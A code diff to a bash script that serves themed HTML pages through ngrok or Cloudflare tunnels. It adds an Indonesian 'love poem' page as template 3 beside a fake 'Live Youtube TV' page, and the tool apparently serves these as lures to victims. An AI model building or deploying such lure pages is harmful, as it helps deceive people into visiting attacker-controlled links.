@@ -261,7 +261,7 @@ payload_cloudflare() {
     sed 's+forwarding_link+'$link'+g' LiveYTTV.html >index3.html
     sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html >index2.html
   elif [[ $option_tem -eq 3 ]]; then
-    sed 's+forwarding_link+'$link'+g' temp3.html >index2.html
+    sed 's+forwarding_link+'$link'+g' pantun1.html >index2.html
   elif [[ $option_tem -eq 4 ]]; then
     sed 's+forwarding_link+'$link'+g' temp4.html >index2.html
   elif [[ $option_tem -eq 5 ]]; then
@@ -435,7 +435,7 @@ payload_ngrok() {
     sed 's+forwarding_link+'$link'+g' LiveYTTV.html >index3.html
     sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html >index2.html
   elif [[ $option_tem -eq 3 ]]; then
-    sed 's+forwarding_link+'$link'+g' temp3.html >index2.html
+    sed 's+forwarding_link+'$link'+g' pantun1.html >index2.html
   elif [[ $option_tem -eq 4 ]]; then
     sed 's+forwarding_link+'$link'+g' temp4.html >index2.html
   elif [[ $option_tem -eq 5 ]]; then
@@ -490,7 +490,7 @@ select_template() {
     printf "\n-----Choose a template----\n"
     printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ucapan cinta nih... kiw kiw\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Pantun cinta\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Coming Soon\e[0m\n"
